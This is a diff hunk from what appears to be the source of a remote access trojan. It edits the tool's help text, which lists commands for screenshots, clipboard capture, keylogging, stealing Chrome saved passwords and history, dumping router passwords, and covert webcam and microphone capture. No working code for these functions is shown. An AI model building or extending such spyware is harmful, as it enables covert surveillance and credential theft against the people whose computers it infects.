@@ -74,8 +74,8 @@ list_of_commands = "---------------------------------------- List of commands --
                    "\nscreenshot ------------- takes screenshot of client computer and sends to host as .png file" \
                    "\ncopy_clipboard --------- copies clipboard of client computer and sends to host computer" \
                    "\nkey_logger ------------- listens to keyboard of client computer for set period of time (seconds)" \
-                   "\nbrowser_password ------- gets saved passwords from google chrome" \
-                   "\nbrowser_history -------- gets history from Google Chrome" \
+                   "\nbrowser_password ------- gets saved passwords from Google Chrome" \
+                   "\nbrowser_history -------- gets history from Google Chrome (Terminates chrome.exe if chrome is running)" \
                    "\nrouter_password --------- gets password of all known routers to computer" \
                    "\nwebcam ----------------- captures image from webcam" \
                    "\nlisten ----------------- listens on mic of client computer for set period of time (seconds)" \
